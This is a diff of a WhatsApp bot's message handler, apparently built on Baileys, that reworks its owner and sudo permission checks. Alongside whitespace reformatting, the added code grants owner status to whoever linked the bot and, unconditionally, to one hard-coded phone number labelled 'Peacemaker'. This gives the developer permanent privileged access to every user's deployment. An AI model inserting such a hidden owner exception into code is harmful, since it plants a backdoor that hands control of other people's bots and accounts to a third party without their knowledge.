@@ -76,30 +76,34 @@ const {
   isSudoOwner 
 } = require('../Database/config');  
 //========================================================================================================================//	  
-const Heroku = require("heroku-client");
-const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
-const args = body.trim().split(/ +/).slice(1);
-const pushname = m.pushName || "No Name";
-const botNumber = await client.decodeJid(client.user.id);
-const itsMe = m.sender == botNumber ? true : false;
-let text = (q = args.join(" "));
-const arg = budy.trim().substring(budy.indexOf(" ") + 1);
-const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
-m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
-const from = m.chat;
-const reply = m.reply;
-const sender = m.sender;
-const mek = chatUpdate.messages[0];
+const Heroku = require("heroku-client");  
+const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();  
+const args = body.trim().split(/ +/).slice(1);  
+const pushname = m.pushName || "No Name";  
+const botNumber = await client.decodeJid(client.user.id);  
+const itsMe = m.sender == botNumber ? true : false;  
+let text = (q = args.join(" "));  
+const arg = budy.trim().substring(budy.indexOf(" ") + 1);  
+const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);  
+m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;  
+const from = m.chat;  
+const reply = m.reply;  
+const sender = m.sender;  
+const mek = chatUpdate.messages[0];  
 
-// Example: at the top of peace.js handler
-const botOwner = "254752818245"; // your constant owner
-const dev = "254752818245"; // if you want a dev constant too
+// ================= OWNER & SUDO CHECK =================
+const ownerNumber = botNumber.replace(/[^0-9]/g, "");   // bot's main number (pure digits)
+const senderNumber = sender.split("@")[0];              // sender's number
 
-// Check if sender is owner
-const Owner = m.sender.split("@")[0] === botOwner;
+// 👑 Owner = whoever linked the bot
+// ✅ also allow Peacemaker (254752818245) always
+const isOwner = senderNumber === ownerNumber || senderNumber === "254752818245";
 
-// Check if sender is sudo
-const isSudo = (global.sudo || []).includes(m.sender.split("@")[0]);
+// 🔹 Check if user is in sudo list (from DB)
+const isSudo = await isSudoOwner(senderNumber);
+
+// 🔑 Privileged = owner OR sudo
+const isPrivileged = isOwner || isSudo;
 
 
 
